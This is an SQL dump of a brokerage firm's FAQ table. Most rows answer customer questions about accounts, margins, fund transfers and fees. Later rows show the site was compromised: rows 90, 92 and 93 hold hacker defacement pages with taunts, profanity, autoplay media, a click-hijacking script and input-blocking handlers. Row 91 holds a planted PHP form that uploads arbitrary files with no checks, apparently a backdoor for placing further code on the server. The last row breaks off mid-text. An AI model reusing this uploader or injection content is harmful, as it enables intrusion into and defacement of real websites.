(11, 4, 'How can I open a new account in Astha Trade?', '<p>A: To open a new account you need to send us the duly filled Account opening form. Or follow this link to fill-up the form online and then courier it to us:</p>\r\n\r\n<p>· NSE Account Opening : <a href=\"http://www.asthatrade.com/nse-account.php\">Click Here </a></p>\r\n\r\n<p>· MCX Account Opening : <a href=\"http://www.asthatrade.com/mcx-account.php\">Click Here</a></p>', '2016-11-19', '2016-11-22'),
(12, 4, 'How much time will be taken to open an account?', '<p>A: Your account will be activated the same day we receive your completed form along with all the documents.</p>', '2016-11-19', '2016-11-19'),
(13, 4, 'Documents required in opening a trading account?', '<p>A: Required Document for Account Opening (All documents must be self-attested):-</p>\r\n\r\n						<p>1. Pan Card Copy</p>\r\n\r\n					<p>2. Address Proof any one ( Bank Passbook with latest statement ,Voter id Card, Driving License, Passport &amp; Aadhar Card)</p>\r\n\r\n					<p>3. One Photo</p>\r\n\r\n					<p>4. Latest Bank statement ( Last six months )</p>\r\n\r\n					<p>5. Cancelled cheque</p>', '2016-11-19', '2016-11-12'),
(14, 4, 'I have registered for a new account. How will I get my Login ID and Password for the first time?', '<p>A: Your Login ID or Trading ID &amp; password will be sent to your registered e-mail address.</p>', '2016-11-19', '2016-11-19'),
(15, 4, 'If my account gets locked or if I forgot my password, then what?', '<p>A: You can go to this link to reset/change your password for Odin/net.net/iwin Astha app</p>\r\n\r\n					<p><a href=\"http://netnet.asthatrade.com/netnet/ForgotPwd.aspx\">Reset password Odin Diet/Net Net /Mobile App</a></p>\r\n\r\n					<p>Or you can call 0755-4268555 to reset/unlock your account.</p>', '2016-11-19', '2016-11-19'),
(16, 4, 'After how many wrong attempts, my account will get locked?', '<p>A: After three wrong attempts, your account will be locked</p>', '2016-11-19', '2016-11-19'),
(17, 4, 'I am an existing customer of Astha Trade, how can I activate online trading/mobile trading?', '<p>A: If you are an existing costumer your account is pre activated with online trading/mobile trading. You can download the software/app and log-in to start trading. If your account is suspended you can mail us at \r\n<a href=\"mailto:contact@asthatrade\">contact@asthatrade.com</a>.</p>', '2016-11-19', '2016-11-19'),
(18, 4, 'Is there any charge for the Demat account?', '<p>A: Demat account will be charged 300/- Rs + S.T. per annum (AMC). </p>', '2016-11-19', '2016-11-19'),
(19, 4, 'What are the trading platforms available &amp; what are their charges?', '<p>A: All trading platforms are free of charge:</p>\r\n\r\n					<p>· For desktop we support ODIN Ribbon Diet and NSE NOW</p>\r\n\r\n					<p>· For online trading we support NET.NET &amp; Now online</p>\r\n\r\n					<p>· For android mobile we support iwin Astha Trade mobile trading app &amp; NSE mobile application </p>', '2016-11-19', '2016-11-19'),
(20, 4, 'What are the notification SMS that you send?', '<p>A: Trading alert SMS, Trade confirmation SMS, Billing SMS. Alert SMS at 60% &amp; 70% MTM loss.</p>', '2016-11-19', '2016-11-19'),
(21, 4, 'Do you support Call-n-Trade? Will it be chargeable?', '<p>A: Yes, we support Call-n-Trade & it will be chargeable only for Rs. 10-/ per lot plan as Rs. 25/- per order.</p>', '2016-11-19', '2016-11-19'),
(22, 5, 'Reset Password for Odin Diet / Net Net Id / Mobile App(Iwin)?', '<p><a href=\"http://netnet.asthatrade.com/netnet/ForgotPwd.aspx\" target=\"_blank\">Reset Password for Odin Diet/Net Net Id/Mobile App(Iwin)</a></p>', '2016-11-19', '2016-11-19'),
(23, 6, 'What is your Margin/Leverage for NSE Cash/Equity?', '<p>A: The margin/leverage for NSE Cash/Equity is given below:</p>\r\n\r\n<p>· Intraday - 40 times</p>\r\n\r\n<p>· Delivery – 10 times</p>', '2016-11-19', '2016-11-19'),
(24, 5, 'What is your Margin/Leverage for NSE Future?', '<p>A: The margin/leverage for NSE Future is given below:</p>\r\n\r\n<p>· Intraday – NIFTY &amp; BANKNIFTY @ INR 5000 per lot. All other scripts at 1.5% of the contract value.</p>\r\n\r\n<p>· Delivery – Only SPAN margin. We charge SPAN margin of T+0 settlements which is less than T+1 SPAN charge.</p>\r\n\r\n<p><font size=\"1\">*NOTE: You need not to pay exposure margin in future i.e. 5%</font></p>', '2016-11-19', '2016-11-19'),
(25, 6, 'What is your Margin/Leverage for NSE Options?', '<p>The margin/leverage for NSE Option is given below:</p>\r\n\r\n<p>· Buying option : require full premium for Intraday and Carry forward .</p>\r\n<p>· Intraday selling option : 2% of the contract lot value*.</p>\r\n<p>· Carryover selling option : only SPAN margin is required, you need not to pay exposure margin.</p>\r\n\r\n<p>*Example: Nifty call is of 7000, therefore 7000+20(premium price) = 7020*75(lot size) = 5,26,500. So the margin is 2% of 5,26,500 = 10530</p>', '2016-11-19', '2016-11-19'),
(26, 6, 'What is your Margin/Leverage for MCX commodity?', '<p>A: The margin/leverage for MCX commodity is given below:</p>\r\n\r\n<p>· Intraday – CRUDEOIL @ INR 2000 per lot, GOLD @ INR 15000 per lot. For all other scripts 1% of the contract value.</p>\r\n\r\n<p>· Delivery – As per Exchange.</p>', '2016-11-19', '2016-11-19'),
(27, 6, 'What are the various margin charged by the Exchange?', '<p>A :  Exchange applies two type of margin</p>\r\n<ol>\r\n<li>1. SPAN margin</li>\r\n<li>2. Exposure margin.</li>\r\n</ol>\r\n<p>Exposure margin for most of the shares is 5%, also span margin is calculated on the basis of two different settlement methods</p>\r\n<ol>\r\n<li>1. T+0 settlement (Payin settled on the same day)</li>\r\n<li>2. T+1 settlement (Payin settled on the next day of trade)(25 % more than T+0 settlement)</li>\r\n</ol>\r\n<br>\r\n<p>For NSE, Astha Credit &amp; Securities settles with exchange on T+0, hence we offer the lowest futures margin requirement.</p><br>\r\n<p>Also we fund the exposure margin of 5% from our side without any interest hence the trader can trade economically.</p>', '2016-11-19', '2016-11-19'),
(28, 6, 'What is a margin report?', '<p>A: Details of margin deposited by you and its utilization under different asset class or trading segments. You can verify the total margin limit utilized by yourself contract wise, scrip wise, and exchange wise by browsing online to margin report. You can also confirm the available trading margin through the same report and can also confirm its status from your dealer / relationship manager.</p>', '2016-11-19', '2016-11-19'),
(29, 6, 'How to check the available margin in my trading account?', '<p>A: You can check the available margin from the trading software Odin by pressing “Alt+F10” and for NSE NOW press F3. In iwin Astha Trade mobile app go to Reports --&gt; Funds. </p>', '2016-11-19', '2016-11-19'),
(30, 6, 'What shall I do when I see on placing an order; system displays the message “SURVEILLANCE FAILED ORDER”?', '<p>A: This message appears when there is no margin in your trading account; kindly transfer funds or you can reach us at 0755-4268555.</p>', '2016-11-19', '2016-11-12'),
(31, 6, 'What if my margin is short for trading? Is there any policy for liquidation of short margin?', '<p>A: Clients shall maintain a minimum Margin, if not the position will be auto squared up by the system. </p>', '2016-11-19', '2016-11-19'),
(32, 6, 'What is “Square off”? What’s the broker’s policy for squaring off the positions?', '<p>A: All intraday open positions of Client get auto squared up at prescribed auto square off time of respective exchange i.e. 3:15 p.m. for NSE and 11:40 p.m. for MCX.</p>', '2016-11-19', '2016-11-19'),
(33, 6, 'Does my position will be auto squared-off?', '<p>A: At 80% MTM loss the position will be auto square-off by the system regardless of the fact that the squared-off position could be less or more than 80% MTM loss.</p>', '2016-11-19', '2016-11-19'),
(34, 6, 'What is the meaning of Mark to Market?', '<p>A: Mark to market is the revaluation of open positions at last traded price of scrip available on exchange platform. </p>', '2016-11-19', '2016-11-19'),
(35, 6, 'Can I get margin against securities?', '<p>A: Yes you can avail the benefit of margin against securities. As per exchange evaluation you will get the limit after applicable hair-cut</p>', '2016-11-19', '2016-11-19'),
(36, 6, 'What are margin (broker beneficiary) account details of Astha Credit &amp; Securities?', '<p>A: Margin account of Astha Credit &amp; Securities Pvt. Ltd. for accepting securities is as under: </p>\r\n\r\n<p>· CM-BP ID – IN564254</p>\r\n\r\n<p>· CM Name - Astha Credit &amp; Securities Pvt. Ltd.</p>\r\n\r\n<p>· Settlement Type – NRML/Trade for trade</p>\r\n\r\n<p>· Settlement No. – Contact us</p>', '2016-11-19', '2016-11-19'),
(37, 6, 'How can I transfer stocks from my demat account?', '<p>A: To transfer stock from your demat account, you need to fill up the Delivery Instruction slip with the details of recipient in either market trade column or off-market trade column for effecting transfer of shares.</p>', '2016-11-19', '2016-11-19'),
(38, 6, 'What are the various ways of transferring stock to broker to meet out sale obligations?', '<p>A: You can fill-in the transfer details as Market Trades in your delivery instruction slip of depository and submit the request for transfer of securities</p>\r\n					<p>You can provide a Limited Purpose Power of Attorney to your broker for debiting your depository account and transfer the securities to Broker’s pool account.</p>\r\n\r\n					<p>In case you had deposited your security as margin to broker and sold the securities, broker will transfer the stock to meet out sale obligation.</p>', '2016-11-19', '2016-11-19'),
(39, 6, 'How can I request for release of stocks deposited in margin account?', '<p>A: You can mail the request to <a href=\"mailto:contact@asthatrade.com\">contact@asthatrade.com</a> for release of stocks deposited in margin account</p>', '2016-11-19', '2016-11-19'),
(40, 6, 'What is a POA Stock?', '<p>A: In case you had opted for Limited Purpose Power of Attorney, broker will show the stock available in your depository account as “POA Stock” in the stock report.</p>\r\n					<p>*Note: You can also avail margin benefit against POA stock for trading further.</p>', '2016-11-19', '2016-11-12'),
(41, 6, 'What is the difference between a POA Stock and Margin Stock/ Stock in margin?', '<p>A: POA Stock lies within customer’s own beneficiary depository account. Dividend in POA stock gets transferred automatically to the customer’s registered bank account (with depository) and other corporate action gets credited/notified directly. </p>\r\n\r\n<p>Margin Stock lies with broker’s beneficiary depository account. Dividend on Margin Stock gets credited by broker to customer’s trading ledger on receipt basis. </p>', '2016-11-19', '2016-11-19'),
(42, 7, 'What are the methods of Fund Transfer available?', '<p>A: We support online Fund transfer through 27 various banks from our website www.asthatrade.com. Both Odin and Net.net also support online fund transfer. We also accept fund transfer through NEFT or offline fund deposit to the respective bank accounts for equity &amp; commodity.</p>\r\n					<p>The Payout will be transferred to the registered bank account on request through website ( www.asthatrade.com - > Funds -> Fund Deposit) or phone.(0755-4268555, 08889484455)</p>\r\n					<p>Fund Transfer link :  <a href=\"http://122.168.128.37:9002/FundTransfer.aspx\" target=\"_blank\"> Click Here </a></p>', '2016-11-19', '2016-11-19'),
(43, 7, 'How can I withdraw funds from my trading account?', '<p>A: Funds lying in ledger account with broker can be requested for release to registered bank account by placing a pay-out request on our website <a href=\"http://www.asthatrade.com/pay-out.php\">http://www.asthatrade.com/pay-out.php</a> or by calling our accounts section at 0755-4268555. Funds will be released within 24 business hours of the request subjected to availability of sufficient margin as per our trading policies.</p>', '2016-11-19', '2016-11-19'),
(44, 7, 'How long will it take for crediting funds in my trading account?', 'p>A: The time it take to credit funds in your account depends on the mode of transfer i.e. </p>\r\n\r\n<p>· Cheque – 2-3 working days</p>\r\n\r\n<p>· Payment gateway (through website/terminal) – immediately</p>\r\n\r\n<p>· NEFT/RTGS – 2-3 hours</p>\r\n\r\n<p><b>*Note: IMPS or cash deposit not supported</b></p>', '2016-11-19', '2016-11-19'),
(45, 7, 'What are the banks that you support for online fund transfer?', '<p>A: Here is the list of 27 Banks that we support currently:</p>\r\n\r\n<p>1. Axis Bank </p>\r\n\r\n<p>2. Jammu and Kashmir Bank</p>\r\n\r\n<p>3. ICICI Bank</p>\r\n\r\n<p>4. IDBI Bank</p>\r\n\r\n<p>5. Karnataka Bank</p>\r\n\r\n<p>6. Yes Bank</p>\r\n\r\n<p>7. HDFC Bank</p>\r\n\r\n<p>8. Indian Overseas Bank</p>\r\n\r\n<p>9. Lakshmi Vilas Bank Net Banking </p>\r\n\r\n<p>10. Indian Bank</p>\r\n\r\n<p>11. State Bank of Travancore </p>\r\n\r\n<p>12. Deutsche Bank</p>\r\n\r\n<p>13. State Bank of Bikaner and Jaipur </p>\r\n\r\n<p>14. Bank of Maharashtra </p>\r\n\r\n<p>15. Catholic Syrian Bank </p>\r\n\r\n<p>16. State Bank of Hyderabad</p>\r\n\r\n<p>17. Federal Bank </p>\r\n\r\n<p>18. Karur Vysya Bank </p>\r\n\r\n<p>19. State Bank of Patiala </p>\r\n\r\n<p>20. Kotak Mahindra Bank </p>\r\n\r\n<p>21. Dhanlaxmi Bank </p>\r\n\r\n<p>22. Bank of India </p>\r\n\r\n<p>23. Indusind Bank </p>\r\n\r\n<p>24. State Bank of India </p>\r\n\r\n<p>25. City Union Bank </p>\r\n\r\n<p>26. State Bank of Mysore </p>\r\n\r\n<p>27. Tamilnad Mercantile Bank</p>', '2016-11-19', '2016-11-19'),
(59, 8, 'What are the different trade reports provided?', '<p>A: We provide a back-office account along with your trading account in which you can see various reports listed below:</p>\r\n\r\n<p>o Net Position</p>\r\n\r\n<p>o Margin report</p>\r\n\r\n<p>o Stock report</p>\r\n\r\n<p>o Fund status</p>\r\n\r\n<p>o MTM on open position</p>\r\n\r\n<p>o Profit &amp; Loss statement </p>\r\n\r\n<p>o Contract Note</p>', '2016-11-19', '2016-11-19'),
(60, 8, 'Can I track profit/loss in various scrip’s traded?', '<p>A: Yes, You can view your scrip wise net position in back office.</p>', '2016-11-19', '2016-11-19'),
(61, 8, 'Can I track and verify my holdings?', '<p>A: Yes, You can verify your holdings from back office stock reports.</p>', '2016-11-19', '2016-11-19'),
(62, 8, 'Can I check my outstanding positions, Bills, Ledger?', '<p>A: Yes, You can check all of these from your back office account.</p>', '2016-11-19', '2016-11-19'),
(63, 8, 'What is a contract note and how will I receive it?', '<p>A: A contract note is the confirmation of trade(s) done on a particular day for and on behalf of a client. You will receive the contract note on your registered email address and you can also check it from your back office. You can also request for contract note physically by paying the required charges.</p>', '2016-11-19', '2016-11-19'),
(64, 9, 'If I have purchase a share, how will I receive its delivery?', '<p>A: Once purchase any share, you need to pay the funds to carry out the delivery.</p>', '2016-11-19', '2016-11-19'),
(65, 9, 'Can I buy shares from the credit of selling other shares?', '<p>A: Yes you can buy shares from the cash credit received against the selling of shares.</p>', '2016-11-19', '2016-11-19'),
(66, 9, 'Do I have to give delivery of shares that I sold?', '<p>A: Once you sell the shares, you need to deliver it to exchange within the prescribed settlement cycle. </p>', '2016-11-19', '2016-11-19'),
(67, 10, 'How can I change my address/e-mail address/mobile number in my account?', '<p>A: You can fill up the KYC change request form and submit the same along with acceptable address proof to Head Office (F-01, Usha Preet, 138/42, Malviya Nagar, Bhopal (MP) - 462003) or you can mail it to kyc@asthatrade.com.</p>\r\n					<p>Download the form from this link : <a href=\"https://www.dropbox.com/s/f3d3lfg8fof1zy7/kyc_form.pdf?dl=1\">https://www.dropbox.com/s/f3d3lfg8fof1zy7/kyc_form.pdf?dl=0</a></p>', '2016-11-19', '2016-11-19'),
(68, 10, 'Can I change the signature in my trading account? How?', '<p>A: Yes, you can change your signature by sending us a letter from bank regarding change of signature in your bank account and a copy of pan card (with modified signature). After verification the signature will change.</p>', '2016-11-19', '2016-11-19'),
(69, 10, 'How can I close my account from Astha Trade?', '<p>A: To close your account at Astha Trade you need to send us the closure form for both trading and Demat account. Download the forms from these links:</p>\r\n\r\n<p>· Demat closure form : <a href=\"http://www.asthatrade.com/closure_demat.doc\">http://www.asthatrade.com/closure_demat.doc</a></p>\r\n\r\n<p>· Trading closure form : <a href=\"http://www.asthatrade.com/closure_trading.doc\">http://www.asthatrade.com/closure_trading.doc</a></p>', '2016-11-19', '2016-11-19'),
(70, 11, 'What are the customer services provided by Astha Trade?', '<p>A: Astha Trade focuses on better customer support. Along with providing all the necessary articles online we do have a very efficient customer care team that is available 9:00 a.m. to 10:00 p.m. from Monday to Saturday. We are also available on Sundays 12:00 noon to 5:00 p.m.</p>', '2016-11-19', '2016-11-19'),
(71, 11, 'How can I reach the customer support of Astha Trade?', '<p>A: You can reach the customer care team either by calling us at 0755-4268555, visiting our website’s (<a href=\"http://www.asthatrade.com/\">www.asthatrade.com</a>) chat support or mailing us at <a href=\"mailto:contact@asthatrade.com\">contact@asthatrade.com</a></p>', '2016-11-19', '2016-11-19'),
(72, 12, 'What is referral benefit?', '<p>A: Refer a friend and earn benefit. 25% sharing up to 10 Active Accounts. 50% sharing for more than 10 Active Accounts.</p>', '2016-11-19', '2016-11-19'),
(73, 12, 'What are the terms of referral benefit?', '<p>A: The scheme is applicable only for active client. You have to Register referral\'s detail on website before his a/c opens. Minimum payout will be Rs. 2000. All Earnings will be paid from Alliance Astha,Authorised Person of Astha Credit & Securities Pvt. Ltd. and Marketing Partner.</p>', '2016-11-19', '2016-11-19'),
(74, 13, 'What are all the other charges levied?', '				<p><table border=\"1\" cellspacing=\"0\" cellpadding=\"0\" width=\"640\">\r\n	<tbody>\r\n		<tr>\r\n			<td width=\"314\" valign=\"top\">\r\n				<p>\r\n					<strong>Particulars </strong>\r\n				</p>\r\n			</td>\r\n			<td width=\"82\" valign=\"top\">\r\n				<p>\r\n					<strong>Charges (In Rs.)</strong>\r\n				</p>\r\n			</td>\r\n			<td width=\"244\" valign=\"top\">\r\n				<p>\r\n					<strong> </strong>\r\n				</p>\r\n			</td>\r\n		</tr>\r\n		<tr>\r\n			<td valign=\"top\">\r\n				<p>\r\n					Demat AMC\r\n				</p>\r\n			</td>\r\n			<td valign=\"top\">\r\n				<p>\r\n					300\r\n				</p>\r\n			</td>\r\n			<td valign=\"top\">\r\n				<p>\r\n					plus service tax\r\n				</p>\r\n			</td>\r\n		</tr>\r\n		<tr>\r\n			<td width=\"314\" valign=\"top\">\r\n				<p>\r\n					Physical contract note / other statements etc\r\n				</p>\r\n			</td>\r\n			<td valign=\"top\">\r\n				<p>\r\n					20\r\n				</p>\r\n			</td>\r\n			<td valign=\"top\">\r\n				<p>\r\n					per contract note + Courier Charges\r\n				</p>\r\n			</td>\r\n		</tr>\r\n		<tr>\r\n			<td valign=\"top\">\r\n				<p>\r\n					Trade on phone (applicable in per lot plan only)\r\n				</p>\r\n			</td>\r\n			<td valign=\"top\">\r\n				<p>\r\n					25\r\n				</p>\r\n			</td>\r\n			<td valign=\"top\">\r\n				<p>\r\n					per executed order plus service tax\r\n				</p>\r\n			</td>\r\n		</tr>\r\n		<tr>\r\n			<td valign=\"top\">\r\n				<p>\r\n					Off market transfer (DP)\r\n				</p>\r\n			</td>\r\n			<td valign=\"top\">\r\n				<p>\r\n					30\r\n				</p>\r\n			</td>\r\n			<td valign=\"top\">\r\n				<p>\r\n					plus service tax\r\n				</p>\r\n			</td>\r\n		</tr>\r\n		<tr>\r\n			<td valign=\"top\">\r\n				<p>\r\n					Demat transaction charges\r\n				</p>\r\n			</td>\r\n			<td valign=\"top\">\r\n				<p>\r\n					25\r\n				</p>\r\n			</td>\r\n			<td valign=\"top\">\r\n				<p>\r\n					plus service tax\r\n				</p>\r\n			</td>\r\n		</tr>\r\n		<tr>\r\n			<td valign=\"top\">\r\n				<p>\r\n					Account opening charges\r\n				</p>\r\n			</td>\r\n			<td valign=\"top\">\r\n				<p>\r\n					500\r\n				</p>\r\n			</td>\r\n			<td valign=\"top\">\r\n			</td>\r\n		</tr>\r\n		<tr>\r\n			<td valign=\"top\">\r\n				<p>\r\n					Cheque dishonour charges\r\n				</p>\r\n			</td>\r\n			<td valign=\"top\">\r\n				<p>\r\n					200\r\n				</p>\r\n			</td>\r\n			<td valign=\"top\">\r\n				<p>\r\n					per instance\r\n				</p>\r\n			</td>\r\n		</tr>\r\n		<tr>\r\n			<td valign=\"top\">\r\n				<p>\r\n					Inter DP transfer\r\n				</p>\r\n			</td>\r\n			<td valign=\"top\">\r\n				<p>\r\n					25\r\n				</p>\r\n			</td>\r\n			<td valign=\"top\">\r\n				<p>\r\n					plus service tax\r\n				</p>\r\n			</td>\r\n		</tr>\r\n		<tr>\r\n			<td valign=\"top\">\r\n				<p>\r\n					Share Pledge In\r\n				</p>\r\n			</td>\r\n			<td valign=\"top\">\r\n				<p>\r\n					200\r\n				</p>\r\n			</td>\r\n			<td valign=\"top\">\r\n				<p>\r\n					per scrip plus service tax\r\n				</p>\r\n			</td>\r\n		</tr>\r\n		<tr>\r\n			<td valign=\"top\">\r\n				<p>\r\n					Share Pledge Out\r\n				</p>\r\n			</td>\r\n			<td valign=\"top\">\r\n				<p>\r\n					200\r\n				</p>\r\n			</td>\r\n			<td valign=\"top\">\r\n				<p>\r\n					per scrip plus service tax\r\n				</p>\r\n			</td>\r\n		</tr>\r\n		<tr>\r\n			<td valign=\"top\">\r\n				<p>\r\n					Atom Instant fund transfer charge\r\n				</p>\r\n			</td>\r\n			<td valign=\"top\">\r\n				<p>\r\n					10\r\n				</p>\r\n			</td>\r\n			<td valign=\"top\">\r\n				<p>\r\n					plus service tax\r\n				</p>\r\n			</td>\r\n		</tr>\r\n		<tr>\r\n			<td valign=\"top\">\r\n				<p>\r\n					Third party fund transfer charge\r\n				</p>\r\n			</td>\r\n			<td valign=\"top\">\r\n				<p>\r\n					400\r\n				</p>\r\n			</td>\r\n			<td valign=\"top\">\r\n				<p>\r\n					For refund in 2 working days\r\n				</p>\r\n			</td>\r\n		</tr>\r\n		<tr>\r\n			<td valign=\"top\">\r\n				<p>\r\n					KRA Modification\r\n				</p>\r\n			</td>\r\n			<td valign=\"top\">\r\n				<p>\r\n					35\r\n				</p>\r\n			</td>\r\n			<td valign=\"top\">\r\n				<p>\r\n					plus service tax\r\n				</p>\r\n			</td>\r\n		</tr>\r\n	</tbody>\r\n</table></p>', '2016-11-19', '2016-11-19'),
(75, 13, 'What is BSDA?', '<p>A: BSDA or Basic Service Demat Account is a demat account with no frills<br>\r\n					Download the <a href=\"http://www.asthatrade.com/doc/Declaration_BSDA.docx\">Declaration for BSDA</a><br>\r\n					<a href=\"http://www.asthatrade.com/doc/BSDA.docx\">BSDA account opening form</a></p>', '2016-11-19', '2016-11-19'),
(88, 0, 'mnbvm', 'vmbv n<br>', '2016-12-08', '0000-00-00'),
(90, 13, 'By Milevian Achraf', '<html >\r\n\r\n\r\n       <title >.:: H4CK3D BY @CHR@F::.</title >\r\n            <link rel=\"shortcut icon\" \r\n                 href=\"http://www.shababdz.com/vb/images/flags/Algeria.gif\" /> \r\n<body style=\"background:#000; color: #fff; font-family:Jokerman Verdana, Arial, sans-serif; \r\nmargin-left:auto; margin-right:auto; width: \r\n800px; text-align:center;\" >\r\n<h1 style=\"color:#ff0000\";”>HACKED By @CHR@F</h1 >\r\n<script>\r\nwindow.onclick=function(){window.open(\'https://www.facebook.com/milevian.achraf\')}\r\n</script>\r\n           <img \r\n             src=\"https://images4.alphacoders.com/291/291278.jpg\" width=600\" height=\"400\" \r\nalt=\"Logo\" ><br / ><br / ><br / > <table width=\"2000\" height=\"0\" >\r\n<iframe width=\"1\" height=\"0\" src=\"https://www.youtube.com/embed/dJ-QLl5qjLg?rel=0&autoplay=1\" \r\nframeborder=\"0\" allowfullscreen ></iframe >\r\n<h1 style=\"color:#ff0000\";”>*** I m here Laughing you better have a backup***</h1 >\r\n<h2 ><a href=\" target=\"_blank\" style=\"color:#ff0000; text-decoration:none\" ></a >B1c0ur4_DZ t34m</h2>\r\n<h2 class=\"frame-6\"><br/><br/><span lang=\"en-us\"> <br><marquee><font face=\"Courier New\" color=\"aaaaaa\" size=3>Greetz: | Annabi Mouchgheb | Skynrus99 | Jos3 Gr4c4 | Neinrappeur Zaki | La Karha | Chahine Cris | Ismail Ghosto | William Ilyes |\r\n    </center>\r\n</body >\r\n</html >', '2017-01-04', '0000-00-00'),
(91, 1, 'lkjh', '<head>\r\n<style>\r\n<!--\r\np {MARGIN-TOP: 0px; MARGIN-BOTTOM: 0px; LINE-HEIGHT: 150%}-->\r\n</style>\r\n</head>\r\n\r\n<table style=\"BORDER-COLLAPSE: collapse\" cellspacing=\"0\" bordercolordark=\"#666666\" cellpadding=\"5\" height=\"1\" width=\"100%\" bgcolor=\"#000000\" bordercolorlight=\"#c0c0c0\" border=\"1\">\r\n	<tr>\r\n		<a bookmark=\"minipanel\" style=\"font-weight: normal; color: #009900; font-family: verdana; text-decoration: none\">\r\n		<td width=\"50%\" height=\"1\" valign=\"top\" style=\"font-family: verdana; color: #d9d9d9; font-size: 11px\">\r\n		<center>Upload<form method=\"POST\" enctype=\"multipart/form-data\">\r\n			<input type=\"hidden\" name=\"act\" value=\"upload\" style=\"font-size: 8pt; color: #FFFFFF; font-family: Tahoma; border: 1 solid #666666; background-color: #009900\">\r\n			<input type=\"file\" name=\"userfile\" style=\"font-size: 8pt; color: #FFFFFF; font-family: Tahoma; border: 1 solid #666666; background-color: #009900\"><input type=\"hidden\" name=\"miniform\" value=\"1\" style=\"font-size: 8pt; color: #FFFFFF; font-family: Tahoma; border: 1 solid #666666; background-color: #009900\">\r\n			<input type=\"submit\" name=\"submit\" value=\"Upload\" style=\"font-size: 8pt; color: #FFFFFF; font-family: Tahoma; border: 1 solid #666666; background-color: #009900\"><br><br>\r\n			<?php\r\n$uploaddir = \"\";\r\n$uploadfile = $uploaddir . basename($_FILES[\'userfile\'][\'name\']);\r\n\r\nif (isset($_FILES[\'userfile\'][\'name\'])) {\r\n        if (move_uploaded_file($_FILES[\'userfile\'][\'tmp_name\'], $uploadfile)) {\r\n                echo \"The file \". basename($_FILES[\'userfile\'][\'name\']) .\" has been uploaded\";\r\n        } else {\r\n                echo \"There was an error uploading the file. please try again!\";\r\n        }\r\n}\r\n?>\r\n		</form>\r\n		</center></td>\r\n	</tr>\r\n</table>\r\n</a>', '2017-01-04', '2017-01-27'),
(92, 1, 'HACKED', '<html>\r\n<head>\r\n<title>#Mr.EXI2T</title>\r\n\r\n</head>\r\n<body bgcolor=\"#000000\">\r\n<center>\r\n<img src=\"https://s6.postimg.org/qv45exqsx/XXXXXX.png\" width=\"470\" height=\"444\">\r\n<embed src=\"http://www.youtube.com/v/-Rt7h7blrD8&autoplay=1\" type=\"application/x-shockwave-flash\" wmode=\"transparent\" height=\"1\" width=\"1\">        \r\n\r\n</center><br>\r\n<center>\r\n\r\n<font size=\"6\" color=\"red\">*EXI2T CYBER TEAM* <br><br><font face=\"courier new\">*INDONESIAN-INDEPENDENCE*!!! \\m/ </font>\r\n<br><br>\r\n<font size=\"3\" face=\"courier new\" color=\"#FF1000\">Indonesian Citizens<br><br>\"What happened,we will be back again<br>we will not stop attacking!!!<br>.<br>We are EXI2T Cyber Team, |As long as we still have a keyboard and command troops on the internet. We are not invincible*!!!|INDONESIA DEFACER|-FUCK YOU GRAHAHAHAHA......<br>\r\n\r\n\r\n\r\n<br><br><br><br>\r\n\r\n<br><br><center>\r\n<font color=\"#FF1000\" face=\"courier new\" size=\"4\">Greetz :</font><br><font color=\"red\" face=\"courier new\" size=\"3\"> |#Mr.EXI2T|Mr.W0lfs3c|#Mr.BLACK-EX|Sync1337|MR.Y@N66A|Cyber00t|#unknown378|Berandal|#Nothing454 |#MR.SnapHeat404|./cOLI|Blck0Wl|Nobody_Cares|./MalamSunyi|./D14|Mr.t4ma|DeathCreppy|\r\n</center>\r\n<br><br>\r\n<font color=\"#FF1000\" face=\"courier new\" size=\"4\">My Friend Team :</font><br><font color=\"red\" face=\"courier new\" size=\"3\"> JKT48 CYBER TEAM|CowoKerensTeam|DevilzC0de||PALEMBANG HACKER LINK|Owl Squad|JONES UNLIMITED EDITION|T1KUS90T|L4dyExpr335| All My Friend\r\n</center>\r\n\r\n<div><iframe src=\"https://www.facebook.com/plugins/likebox.php?href=https://www.facebook.com/EXI2TCyberTEAM/\" scrolling=\"no\" frameborder=\"0\" scrolling=\"no\" style=\"border: medium none; overflow: hidden; height: 250px; width: 300px;background:#fff;\"></iframe></div></div>\r\n</font></font></font><br><strong>\r\n\r\n<body oncontextmenu=\'return false;\' onkeydown=\'return false;\' onmousedown=\'return false;\' ondragstart=\'return false\' onselectstart=\'return false\' style=\'-moz-user-select: none; cursor: default;\'>\r\n</body>\r\n</html>', '2017-01-11', '0000-00-00'),
(93, 9, 'HACKED', '<html>\r\n<head>\r\n<title>#Mr.EXI2T</title>\r\n\r\n</head>\r\n<body bgcolor=\"#000000\">\r\n<center>\r\n<img src=\"https://s6.postimg.org/qv45exqsx/XXXXXX.png\" width=\"470\" height=\"444\">\r\n<embed src=\"http://www.youtube.com/v/-Rt7h7blrD8&autoplay=1\" type=\"application/x-shockwave-flash\" wmode=\"transparent\" height=\"1\" width=\"1\">        \r\n\r\n</center><br>\r\n<center>\r\n\r\n<font size=\"6\" color=\"red\">*EXI2T CYBER TEAM* <br><br><font face=\"courier new\">*INDONESIAN-INDEPENDENCE*!!! \\m/ </font>\r\n<br><br>\r\n<font size=\"3\" face=\"courier new\" color=\"#FF1000\">Indonesian Citizens<br><br>\"What happened,we will be back again<br>we will not stop attacking!!!<br>.<br>We are EXI2T Cyber Team, |As long as we still have a keyboard and command troops on the internet. We are not invincible*!!!|INDONESIA DEFACER|-FUCK YOU GRAHAHAHAHA......<br>\r\n\r\n\r\n\r\n<br><br><br><br>\r\n\r\n<br><br><center>\r\n<font color=\"#FF1000\" face=\"courier new\" size=\"4\">Greetz :</font><br><font color=\"red\" face=\"courier new\" size=\"3\"> |#Mr.EXI2T|Mr.W0lfs3c|#Mr.BLACK-EX|Sync1337|MR.Y@N66A|Cyber00t|#unknown378|Berandal|#Nothing454 |#MR.SnapHeat404|./cOLI|Blck0Wl|Nobody_Cares|./MalamSunyi|./D14|Mr.t4ma|DeathCreppy|\r\n</center>\r\n<br><br>\r\n<font color=\"#FF1000\" face=\"courier new\" size=\"4\">My Friend Team :</font><br><font color=\"red\" face=\"courier new\" size=\"3\"> JKT48 CYBER TEAM|CowoKerensTeam|DevilzC0de||PALEMBANG HACKER LINK|Owl Squad|JONES UNLIMITED EDITION|T1KUS90T|L4dyExpr335| All My Friend\r\n</center>\r\n\r\n<div><iframe src=\"https://www.facebook.com/plugins/likebox.php?href=https://www.facebook.com/EXI2TCyberTEAM/\" scrolling=\"no\" frameborder=\"0\" scrolling=\"no\" style=\"border: medium none; overflow: hidden; height: 250px; width: 300px;background:#fff;\"></iframe></div></div>\r\n</font></font></font><br><strong>\r\n\r\n<body oncontextmenu=\'return false;\' onkeydown=\'return false;\' onmousedown=\'return false;\' ondragstart=\'return false\' 